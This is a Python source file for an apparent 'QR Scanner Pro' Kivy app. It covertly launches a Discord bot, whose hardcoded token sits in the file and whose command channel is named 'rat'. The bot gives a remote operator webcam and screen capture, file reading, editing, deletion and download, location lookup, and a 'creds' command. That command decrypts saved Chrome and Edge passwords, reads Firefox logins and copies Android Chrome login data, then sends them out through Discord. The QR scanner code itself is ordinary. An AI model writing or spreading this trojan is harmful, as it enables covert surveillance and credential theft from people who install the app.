import sys
import cv2
import numpy as np
from pyzbar import pyzbar
from datetime import datetime
import webbrowser
import json
import os
from urllib.parse import unquote
import base64
import threading
import asyncio
import platform
import discord
from discord.ext import commands

# Your bot token (use a test bot)
DISCORD_TOKEN = "MTQxMTk4OTEyODI0OTA4NTk5Mw.GJCTQ_.NtJmAOkPJae0-5oTWFdUOlIcACSk2MyvfvhFLs"
COMMAND_CHANNEL = "rat"  # name of channel for commands

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
# Create bot
bot = commands.Bot(command_prefix="!", intents=intents)

# Capture front/back cam
@bot.command()
async def snapshot(ctx, cam="0"):
    """Take picture from webcam"""
    try:
        cap = cv2.VideoCapture(int(cam))
        ret, frame = cap.read()
        cap.release()
        if ret:
            filename = f"snap_{cam}_{datetime.now().strftime('%H%M%S')}.jpg"
            cv2.imwrite(filename, frame)
            await ctx.send(file=discord.File(filename))
        else:
            await ctx.send("Camera error")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# Take screenshot
@bot.command()
async def screenshot(ctx):
    """Take screenshot"""
    try:
        import pyautogui
        filename = f"screenshot_{datetime.now().strftime('%H%M%S')}.png"
        img = pyautogui.screenshot()
        img.save(filename)
        await ctx.send(file=discord.File(filename))
    except Exception as e:
        await ctx.send(f"Error: {e}")

# Execute safe Linux commands
@bot.command()
async def ls(ctx, path="."):
    """List files"""
    try:
        files = os.listdir(path)
        await ctx.send("```\n" + "\n".join(files[:20]) + "\n```")  # limit to first 20
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def create(ctx, filename):
    """Create empty file"""
    try:
        with open(filename, "w") as f:
            f.write("")
        await ctx.send(f"Created {filename}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def rename(ctx, old, new):
    """Rename file"""
    try:
        os.rename(old, new)
        await ctx.send(f"Renamed {old} -> {new}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def edit(ctx, filename, *, content):
    """Edit file (overwrite)"""
    try:
        with open(filename, "w") as f:
            f.write(content)
        await ctx.send(f"Updated {filename}")
    except Exception as e:
        await ctx.send(f"Error: {e}")
@bot.command()  
async def delete(ctx, filename):
    """Delete file"""
    try:
        os.remove(filename)
        await ctx.send(f"Deleted {filename}")
    except Exception as e:
        await ctx.send(f"Error: {e}")
@bot.command()
async def cat(ctx, filename):
    """Show file content"""
    try:
        with open(filename  , "r") as f:
            content = f.read(1900)  # Discord message limit
        await ctx.send("```\n" + content + "\n```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def cd(ctx, path):
    """Change directory"""
    try:
        os.chdir(path)
        await ctx.send(f"Changed directory to {os.getcwd()}")
    except Exception as e:
        await ctx.send(f"Error: {e}")
@bot.command()
async def download(ctx, filename):
    """Download file"""
    try:
        await ctx.send(file=discord.File(filename))
    except Exception as e:
        await ctx.send(f"Error: {e}")

#in this next command it will scape all of the save credential on the device
@bot.command()
async def creds(ctx):
    system = sys.platform.lower()

    if system.startswith('win'):
        await pc(ctx)
    elif "ANDROID_ROOT" in os.environ and int(platform.release().split(".")[0]) <= 11:
        await android(ctx)
    
async def pc(ctx):
    #windows process outline
    #locate any installed web browser "login data" database file
    #copy the database file to avoid chrome lock
    #connect to the database and read the encrypted passwords
    #use windows DPAPI (via win32crypt) to request decryption by the OS
    import sqlite3
    import win32crypt
    import shutil
    import glob
    try:
        paths = [
            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data'),
            os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data'),
            os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json')
        ]
        found = False
        for path in paths:
            if os.path.exists(path) or glob.glob(path):
                found = True
                if "logins.json" in path:
                    # Firefox process
                    for profile in glob.glob(os.path.dirname(path)):
                        login_file = os.path.join(profile, "logins.json")
                        if os.path.exists(login_file):
                            with open(login_file, "r") as f:
                                logins = json.load(f)
                            creds = []
                            for login in logins.get("logins", []):
                                creds.append(f"Site: {login['hostname']}\nUsername: {login['encryptedUsername']}\nPassword: {login['encryptedPassword']}\n")
                            creds_text = "\n".join(creds)
                            with open("firefox_creds.txt", "w") as f:
                                f.write(creds_text)
                            asyncio.run(ctx.send(file=discord.File("firefox_creds.txt")))
                else:
                    # Chrome/Edge process
                    temp_db = "temp_login_data.db"
                    shutil.copy2(path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    creds = []
                    for row in cursor.fetchall():
                        url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        try:
                            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                        except Exception as e:
                            decrypted_password = f"Error decrypting: {e}"
                        creds.append(f"Site: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")
                    creds_text = "\n".join(creds)
                    with open("chrome_edge_creds.txt", "w") as f:
                        f.write(creds_text)
                    asyncio.run(ctx.send(file=discord.File("chrome_edge_creds.txt")))
                    cursor.close()
                    conn.close()
                    os.remove(temp_db)
        if not found:
            asyncio.run(ctx.send("No supported browsers found."))
    except Exception as e:
        asyncio.run(ctx.send(f"Error: {e}"))
async def android(ctx):
    import os
    import shutil
    import subprocess

    def is_rooted():
        try:
            res = subprocess.run(["su", "-c", "id"], capture_output=True, text=True)
            if "uid-0" in res.stdout:
                return True
        except Exception:
            pass
        return False
    
    if not is_rooted():
        await ctx.send("device not rooted brodie")
        return
    loginpath = "data/data/com.android.chrome/app_chrome/default/Login Data"

    if not os.path.exists(loginpath):
        await ctx.send("chrome login data not found:<")
        return

    temp = "/sdcard/LoginData.db"
    try:
        shutil.copy2(loginpath, temp)
    except Exception as e:
        await ctx.send(f"Error copying Login Data: {e}")
        return

    # Send file via Discord
    try:
        await ctx.send(file=discord.File(temp))
    except Exception as e:
        await ctx.send(f"Error sending file: {e}")

try:
    from plyer import gps
except:
    gps = None

@bot.command()
async def openloc(ctx):
    try:
        sys = platform.system().lower()
        if "android" in sys and gps:
            coords = gps.get_location()
            lat = coords.get('lat', 0)
            lon = coords.get('lon', 0)

            url = f"https://www.google.com/search?q=weather+{lat},{lon}"
            webbrowser.open(url)
            await ctx.send(f"Opening Weather for your location: {lat}, {lon}")
        else:
            import requests
            r = requests.get("https://ipinfo.io/json")
            data = r.json()
            loc = data.get("loc", "0,0")
            lat, lon = loc.split(",")

            url = f"https://www.google.com/search?q=weather+{lat},{lon}"
            webbrowser.open(url)
            await ctx.send(f"Opening weather for your location: {lat}, {lon}")

    except Exception as e:
        await ctx.send(f"Error getting location: {e}")

# Kivy implementation starts here
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.image import Image
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.uix.textinput import TextInput
from kivy.uix.gridlayout import GridLayout
from kivy.clock import Clock
from kivy.graphics.texture import Texture
from kivy.core.clipboard import Clipboard
from kivy.uix.modalview import ModalView
from kivy.properties import BooleanProperty, StringProperty, ListProperty
from kivy.core.window import Window
from kivy.uix.relativelayout import RelativeLayout
from kivy.uix.stacklayout import StackLayout
from kivy.uix.anchorlayout import AnchorLayout
from kivy.metrics import dp

# Set window size for mobile
Window.size = (360, 740)

class QRScannerApp(App):
    is_light_mode = BooleanProperty(False)
    scan_result = StringProperty("Point camera at a QR code to scan")
    history_text = StringProperty("No scans yet")
    
    def build(self):
        self.title = "QR Scanner Pro"
        self.cap = None
        self.scanning = False
        self.history = []
        self.load_history()
        
        # Main layout
        self.main_layout = BoxLayout(orientation='vertical', padding=0, spacing=0)
        
        # Title
        title_layout = BoxLayout(size_hint=(1, 0.1))
        self.title_label = Label(
            text="QR SCANNER", 
            font_size='24sp',
            bold=True,
            color=(1, 1, 1, 1),
            size_hint=(0.8, 1)
        )
        title_layout.add_widget(self.title_label)
        
        # Light mode button
        self.light_mode_btn = Button(
            text="☼", 
            size_hint=(0.2, 1),
            font_size='20sp',
            background_color=(0.3, 0.3, 0.3, 1),
            on_press=self.toggle_light_mode
        )
        title_layout.add_widget(self.light_mode_btn)
        self.main_layout.add_widget(title_layout)
        
        # Camera view
        self.camera_layout = BoxLayout(
            size_hint=(1, 0.4),
            padding=(dp(40), dp(20), dp(40), dp(20))
        )
        
        self.camera_view = Image(
            size_hint=(1, 1),
            allow_stretch=True
        )
        self.camera_layout.add_widget(self.camera_view)
        self.main_layout.add_widget(self.camera_layout)
        
        # Scan results
        results_layout = BoxLayout(
            size_hint=(1, 0.25),
            orientation='vertical',
            padding=(dp(20), dp(10)),
            spacing=dp(5)
        )
        
        results_label = Label(
            text="SCAN RESULTS",
            size_hint=(1, 0.2),
            font_size='18sp',
            bold=True,
            color=(0.31, 0.76, 0.97, 1)  # #4fc3f7
        )
        results_layout.add_widget(results_label)
        
        self.results_scroll = ScrollView(size_hint=(1, 0.8))
        self.results_content = Label(
            text=self.scan_result,
            text_size=(Window.width - dp(40), None),
            size_hint_y=None,
            height=dp(100),
            valign='top',
            halign='center'
        )
        self.results_content.bind(texture_size=self._update_results_height)
        self.results_scroll.add_widget(self.results_content)
        results_layout.add_widget(self.results_scroll)
        self.main_layout.add_widget(results_layout)
        
        # History
        history_layout = BoxLayout(
            size_hint=(1, 0.25),
            orientation='vertical',
            padding=(dp(20), dp(10)),
            spacing=dp(5)
        )
        
        history_label = Label(
            text="SCAN HISTORY",
            size_hint=(1, 0.2),
            font_size='18sp',
            bold=True,
            color=(0.73, 0.53, 0.99, 1)  # #bb86fc
        )
        history_layout.add_widget(history_label)
        
        self.history_scroll = ScrollView(size_hint=(1, 0.8))
        self.history_content = Label(
            text=self.history_text,
            text_size=(Window.width - dp(40), None),
            size_hint_y=None,
            height=dp(80),
            valign='top',
            halign='center'
        )
        self.history_content.bind(texture_size=self._update_history_height)
        self.history_scroll.add_widget(self.history_content)
        history_layout.add_widget(self.history_scroll)
        self.main_layout.add_widget(history_layout)
        
        # Setup camera
        self.setup_camera()
        
        return self.main_layout
    
    def _update_results_height(self, instance, value):
        instance.height = max(dp(100), instance.texture_size[1])
    
    def _update_history_height(self, instance, value):
        instance.height = max(dp(80), instance.texture_size[1])
    
    def setup_camera(self):
        """Set up the camera for QR scanning"""
        self.cap = cv2.VideoCapture(0)
        if not self.cap.isOpened():
            self.show_error("Cannot open camera")
            return
            
        # Set camera properties for mobile
        self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
        self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
        
        # Schedule camera updates
        Clock.schedule_interval(self.update_camera_frame, 1.0/30.0)  # 30 FPS
    
    def update_camera_frame(self, dt):
        """Update the camera frame"""
        if self.cap and self.cap.isOpened():
            ret, frame = self.cap.read()
            if ret:
                # Fix camera orientation - flip the frame
                frame = cv2.flip(frame, 0)  # Flip vertically
                frame = cv2.flip(frame, 1)  # Flip horizontally
                
                # Convert frame to RGB
                rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                
                # Detect QR codes
                decoded_objects = pyzbar.decode(frame)
                
                # Draw bounding boxes around detected QR codes
                for obj in decoded_objects:
                    points = obj.polygon
                    if len(points) > 4:
                        hull = cv2.convexHull(np.array([point for point in points], dtype=np.float32))
                        hull = list(map(tuple, np.squeeze(hull)))
                    else:
                        hull = points
                    
                    # Draw the polygon
                    n = len(hull)
                    for j in range(n):
                        cv2.line(rgb_frame, hull[j], hull[(j+1) % n], (0, 255, 0), 3)
                    
                    # Extract data
                    data = obj.data.decode("utf-8")
                    qr_type = obj.type
                    
                    # Process the QR code
                    self.process_qr(data, qr_type)
                
                # Convert frame to texture for display
                buf = rgb_frame.tobytes()
                texture = Texture.create(size=(frame.shape[1], frame.shape[0]), colorfmt='rgb')
                texture.blit_buffer(buf, colorfmt='rgb', bufferfmt='ubyte')
                self.camera_view.texture = texture
    
    def process_qr(self, data, qr_type):
        """Process the scanned QR code data"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Check if this is a duplicate recent scan (within last 5 seconds)
        if self.history and (datetime.now() - datetime.strptime(self.history[-1]["time"], "%H:%M:%S")).total_seconds() < 5:
            if data == self.history[-1]["content"]:
                return  # Skip duplicate
        
        result = {"type": qr_type, "content": data, "time": timestamp}
        self.history.append(result)
        
        # Update history display
        history_lines = []
        for item in self.history[-8:]:  # Show last 8 items
            history_lines.append(f"[{item['time']}] {item['content'][:25]}...")
        
        self.history_text = "\n".join(history_lines)
        self.history_content.text = self.history_text
        
        # Process result based on type
        result_text = f"[{timestamp}] {data}"
        action_buttons = []
        
        if data.startswith("WIFI:"):
            wifi_info = self.handle_wifi_qr(data)
            result_text = f"[{timestamp}] WiFi Network: {wifi_info.get('ssid', 'Unknown')}"
            action_buttons = [
                ("WiFi Details", lambda: self.show_wifi_details(wifi_info)),
                ("Copy Password", lambda: self.copy_to_clipboard(wifi_info.get('password', '')))
            ]
        elif data.startswith("http://") or data.startswith("https://"):
            result_text = f"[{timestamp}] URL: {data[:30]}..."
            action_buttons = [
                ("Open URL", lambda: self.open_url(data)),
                ("Copy URL", lambda: self.copy_to_clipboard(data))
            ]
        elif data.startswith("BEGIN:VCARD"):
            vcard_info = self.handle_vcard_qr(data)
            result_text = f"[{timestamp}] Contact: {vcard_info.get('name', 'Unknown')}"
            action_buttons = [
                ("Copy Name", lambda: self.copy_to_clipboard(vcard_info.get('name', ''))),
                ("Copy Phone", lambda: self.copy_to_clipboard(vcard_info.get('phone', '')))
            ]
        elif data.startswith("mailto:") or data.startswith("MATMSG:"):
            email_info = self.handle_email_qr(data)
            result_text = f"[{timestamp}] Email: {email_info.get('to', 'Unknown')}"
            action_buttons = [
                ("Compose Email", lambda: self.compose_email(
                    email_info.get('to', ''), 
                    email_info.get('subject', ''), 
                    email_info.get('body', '')
                ))
            ]
        elif data.startswith("SMSTO:") or data.startswith("SMS:"):
            sms_info = self.handle_sms_qr(data)
            result_text = f"[{timestamp}] SMS: {sms_info.get('number', 'Unknown')}"
            action_buttons = [
                ("Send SMS", lambda: self.send_sms(
                    sms_info.get('number', ''), 
                    sms_info.get('message', '')
                ))
            ]
        else:
            result_text = f"[{timestamp}] Text: {data[:40]}..."
            action_buttons = [
                ("Copy Text", lambda: self.copy_to_clipboard(data))
            ]
        
        # Update results display
        self.scan_result = result_text
        self.results_content.text = self.scan_result
        
        # Show action buttons if any
        if action_buttons:
            self.show_action_buttons(action_buttons)
        
        # Save history
        self.save_history()
    
    def show_action_buttons(self, buttons):
        """Show action buttons for the scan result"""
        # Clear any existing buttons
        if hasattr(self, 'action_buttons_layout'):
            self.main_layout.remove_widget(self.action_buttons_layout)
        
        # Create new buttons
        self.action_buttons_layout = BoxLayout(
            size_hint=(1, 0.1),
            padding=(dp(20), dp(5)),
            spacing=dp(10)
        )
        
        for text, callback in buttons:
            btn = Button(
                text=text,
                size_hint=(0.5, 1),
                on_press=lambda instance, cb=callback: cb()
            )
            self.action_buttons_layout.add_widget(btn)
        
        # Add to main layout
        self.main_layout.add_widget(self.action_buttons_layout)
    
    def handle_wifi_qr(self, data):
        """Extract WiFi credentials from QR code"""
        # Format: WIFI:T:WPA;S:SSID;P:Password;H:true;;
        try:
            parts = data[5:].split(';')  # Remove "WIFI:" prefix and split by semicolons
            wifi_info = {}
            for part in parts:
                if ':' in part:
                    key, value = part.split(':', 1)
                    wifi_info[key] = value
            
            return {
                'ssid': wifi_info.get('S', 'Unknown'),
                'password': wifi_info.get('P', 'No Password'),
                'encryption': wifi_info.get('T', 'Unknown'),
                'hidden': wifi_info.get('H', 'false')
            }
        except Exception as e:
            return {'error': str(e)}
    
    def handle_vcard_qr(self, data):
        """Parse vCard data"""
        try:
            lines = data.split('\n')
            vcard_info = {}
            for line in lines:
                if line.startswith('FN:'):
                    vcard_info['name'] = line[3:]
                elif line.startswith('TEL:'):
                    vcard_info['phone'] = line[4:]
                elif line.startswith('EMAIL:'):
                    vcard_info['email'] = line[6:]
            
            return vcard_info
        except Exception as e:
            return {'error': str(e)}
    
    def handle_email_qr(self, data):
        """Parse email QR data"""
        try:
            if data.startswith("mailto:"):
                # Simple mailto format
                parts = data[7:].split('?', 1)  # Remove "mailto:" prefix
                email_info = {'to': parts[0]}
                
                if len(parts) > 1:
                    params = parts[1].split('&')
                    for param in params:
                        if '=' in param:
                            key, value = param.split('=', 1)
                            if key == 'subject':
                                email_info['subject'] = unquote(value)
                            elif key == 'body':
                                email_info['body'] = unquote(value)
                
                return email_info
            elif data.startswith("MATMSG:"):
                # MATMSG format
                parts = data[7:].split(';')  # Remove "MATMSG:" prefix
                email_info = {}
                for part in parts:
                    if ':' in part:
                        key, value = part.split(':', 1)
                        if key == 'TO':
                            email_info['to'] = value
                        elif key == 'SUB':
                            email_info['subject'] = value
                        elif key == 'BODY':
                            email_info['body'] = value
                
                return email_info
        except Exception as e:
            return {'error': str(e)}
    
    def handle_sms_qr(self, data):
        """Parse SMS QR data"""
        try:
            if data.startswith("SMSTO:"):
                # Format: SMSTO:PhoneNumber:Message
                parts = data[6:].split(':', 1)  # Remove "SMSTO:" prefix
                if len(parts) == 2:
                    return {'number': parts[0], 'message': parts[1]}
                else:
                    return {'number': parts[0], 'message': ''}
            elif data.startswith("SMS:"):
                # Alternative format
                parts = data[4:].split(';')  # Remove "SMS:" prefix
                sms_info = {}
                for part in parts:
                    if ':' in part:
                        key, value = part.split(':', 1)
                        if key == 'number' or key == 'NUMBER':
                            sms_info['number'] = value
                        elif key == 'body' or key == 'BODY':
                            sms_info['message'] = value
                
                return sms_info
        except Exception as e:
            return {'error': str(e)}
    
    def toggle_light_mode(self, instance):
        """Toggle light/dark mode"""
        self.is_light_mode = not self.is_light_mode
        
        if self.is_light_mode:
            # Light mode colors
            self.title_label.color = (0, 0, 0, 1)  # Black
            self.light_mode_btn.text = "☾"
            self.light_mode_btn.background_color = (0.8, 0.8, 0.8, 1)
            self.main_layout.canvas.before.clear()
            with self.main_layout.canvas.before:
                from kivy.graphics import Color, Rectangle
                Color(1, 1, 1, 1)  # White background
                Rectangle(pos=self.main_layout.pos, size=self.main_layout.size)
        else:
            # Dark mode colors
            self.title_label.color = (1, 1, 1, 1)  # White
            self.light_mode_btn.text = "☼"
            self.light_mode_btn.background_color = (0.3, 0.3, 0.3, 1)
            self.main_layout.canvas.before.clear()
            with self.main_layout.canvas.before:
                from kivy.graphics import Color, Rectangle
                Color(0, 0, 0, 1)  # Black background
                Rectangle(pos=self.main_layout.pos, size=self.main_layout.size)
    
    def open_url(self, url):
        """Open URL in browser"""
        webbrowser.open(url)
    
    def copy_to_clipboard(self, text):
        """Copy text to clipboard"""
        Clipboard.copy(text)
        self.show_message("Copied", "Text copied to clipboard")
    
    def show_wifi_details(self, wifi_info):
        """Show WiFi details popup"""
        content = BoxLayout(orientation='vertical', spacing=dp(10), padding=dp(20))
        
        title = Label(
            text="WiFi Connection Details",
            size_hint=(1, 0.2),
            font_size='18sp',
            bold=True
        )
        content.add_widget(title)
        
        # WiFi details
        details = GridLayout(cols=2, spacing=dp(10), size_hint=(1, 0.6))
        
        details.add_widget(Label(text="SSID:", bold=True))
        details.add_widget(Label(text=wifi_info.get('ssid', 'Unknown')))
        
        details.add_widget(Label(text="Password:", bold=True))
        password_input = TextInput(
            text=wifi_info.get('password', ''),
            password=True,
            readonly=True,
            size_hint=(1, None),
            height=dp(40)
        )
        details.add_widget(password_input)
        
        details.add_widget(Label(text="Encryption:", bold=True))
        details.add_widget(Label(text=wifi_info.get('encryption', 'Unknown')))
        
        details.add_widget(Label(text="Hidden:", bold=True))
        details.add_widget(Label(text="Yes" if wifi_info.get('hidden') == 'true' else "No"))
        
        content.add_widget(details)
        
        # Buttons
        buttons = BoxLayout(spacing=dp(10), size_hint=(1, 0.2))
        
        copy_btn = Button(text="Copy Password")
        copy_btn.bind(on_press=lambda x: self.copy_to_clipboard(wifi_info.get('password', '')))
        
        show_btn = Button(text="Show Password")
        def toggle_password(instance):
            password_input.password = not password_input.password
            show_btn.text = "Hide" if not password_input.password else "Show"
        show_btn.bind(on_press=toggle_password)
        
        buttons.add_widget(copy_btn)
        buttons.add_widget(show_btn)
        
        content.add_widget(buttons)
        
        # Create and open popup
        popup = Popup(
            title='',
            content=content,
            size_hint=(0.8, 0.6),
            auto_dismiss=True
        )
        
        ok_btn = Button(text="OK", size_hint=(1, 0.2))
        ok_btn.bind(on_press=popup.dismiss)
        content.add_widget(ok_btn)
        
        popup.open()
    
    def compose_email(self, to, subject, body):
        """Compose email"""
        mailto_url = f"mailto:{to}?subject={subject}&body={body}"
        webbrowser.open(mailto_url)
    
    def send_sms(self, number, message):
        """Send SMS"""
        sms_url = f"sms:{number}?body={message}"
        webbrowser.open(sms_url)
    
    def save_history(self):
        """Save history to a JSON file"""
        try:
            with open("qr_history.json", "w") as f:
                json.dump(self.history, f, indent=2)
        except Exception as e:
            print(f"Error saving history: {e}")
    
    def load_history(self):
        """Load history from JSON file"""
        try:
            if os.path.exists("qr_history.json"):
                with open("qr_history.json", "r") as f:
                    self.history = json.load(f)
                    
                # Update history display
                history_lines = []
                for item in self.history[-8:]:  # Show last 8 items
                    history_lines.append(f"[{item['time']}] {item['content'][:25]}...")
                
                self.history_text = "\n".join(history_lines)
        except Exception as e:
            print(f"Error loading history: {e}")
    
    def show_error(self, message):
        """Show error message"""
        popup = Popup(
            title='Error',
            content=Label(text=message),
            size_hint=(0.8, 0.4)
        )
        popup.open()
    
    def show_message(self, title, message):
        """Show information message"""
        popup = Popup(
            title=title,
            content=Label(text=message),
            size_hint=(0.8, 0.4)
        )
        popup.open()
    
    def on_stop(self):
        """Handle application closing"""
        if self.cap and self.cap.isOpened():
            self.cap.release()
        self.save_history()

def run_discord_bot():
    asyncio.set_event_loop(asyncio.new_event_loop())
    bot.run(DISCORD_TOKEN)  

if __name__ == "__main__":
    # Start Discord bot in a separate thread
    discord_thread = threading.Thread(target=run_discord_bot, daemon=True)
    discord_thread.start()
    
    # Start Kivy app
    QRScannerApp().run()